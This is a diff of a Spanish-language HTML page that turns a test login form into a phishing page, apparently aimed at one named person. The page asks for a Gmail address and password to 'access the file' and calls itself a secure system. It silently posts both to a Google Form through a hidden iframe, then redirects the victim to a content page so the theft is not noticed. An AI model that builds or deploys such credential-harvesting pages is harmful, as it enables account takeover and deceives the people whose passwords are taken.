@@ -3,29 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Para mi princesa, te seguire amando</title>
+    <title>Para LAC20025</title>
     <style>
-        body { background-color: #C2858C; font-family: 'Arial', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .cajita-login { background-color: white; padding: 40px; border-radius: 15px; width: 320px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #C2858C; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        /* AQUÍ ESTÁ EL DISEÑO ROSA QUE TE GUSTABA */
+        body {
+            background-color: #C2858C; /* Tu color rosa */
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .cajita-login {
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            width: 320px;
+            text-align: center;
+        }
+        h1 { color: #333; font-size: 24px; margin-bottom: 5px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #C2858C; /* Botón del mismo color */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+        button:hover { background-color: #a06b71; }
+        
+        .nota-seguridad { font-size: 11px; color: #888; margin-top: 20px; }
     </style>
+
+    <script type="text/javascript">var submitted=false;</script>
 </head>
 <body>
 
-    <div class="cajita-login">
-        <h1>PRUEBA DE ERROR</h1>
-        <p>Ingresa datos para ver qué dice Google</p>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+        onload="if(submitted) {window.location='https://yasukejs.github.io/PARA_CYNTHIA/contenido.html';}">
+    </iframe>
 
-        <form action="https://docs.google.com/forms/d/e/1FAIpQLSdpYCQhSwZYnBbolikOTIG707rYSIFnkvHIHR5x3tNEl_sJWw/formResponse" method="POST">
+    <div class="cajita-login">
+        <h1>Para LAC20025</h1>
+        <p>Ingresa tus datos para acceder al archivo</p>
+
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLSdpYCQhSwZYnBbolikOTIG707rYSIFnkvHIHR5x3tNEl_sJWw/formResponse" 
+              method="POST" target="hidden_iframe" 
+              onsubmit="submitted=true;">
             
-            <input type="email" name="entry.796612169" placeholder="Correo" required>
+            <input type="email" name="entry.796612169" placeholder="Correo electrónico" 
+                   pattern=".+@gmail\.com" 
+                   title="Solo se aceptan correos @gmail.com" required>
+            
             <input type="password" name="entry.114206323" placeholder="Contraseña" required>
 
             <button type="submit">Entrar</button>
         </form>
+
+        <div class="nota-seguridad">
+            *Sistema seguro de archivo de datos.
+        </div>
     </div>
 
 </body>
 </html>
-
